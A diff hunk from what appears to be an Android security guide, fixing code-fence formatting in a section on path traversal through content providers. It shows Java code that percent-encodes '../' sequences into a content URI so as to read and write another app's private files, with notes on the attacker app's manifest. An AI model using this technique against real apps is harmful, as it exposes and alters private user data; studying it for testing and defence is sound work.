@@ -6,12 +6,12 @@ or `uri.getPath()` without canonicalization.
 **Exploit technique:** percent-encode traversal slashes before building the URI
 (`Uri.encode(target, "")`) so `../` survives Android's path-segment splitting:
 
-\`\`\`java
+```java
 String target = "../../../../data/data/<victim.pkg>/<private/path>";
 Uri uri = Uri.parse("content://<authority>/" + Uri.encode(target, ""));
 getContentResolver().openInputStream(uri);  // read
 getContentResolver().openOutputStream(uri); // write (needs file to already exist unless MODE_CREATE is honored)
-\`\`\`
+```
 
 **Gotchas:**
 - Package Visibility (API 30+) requires `<queries>` in the attacker manifest for
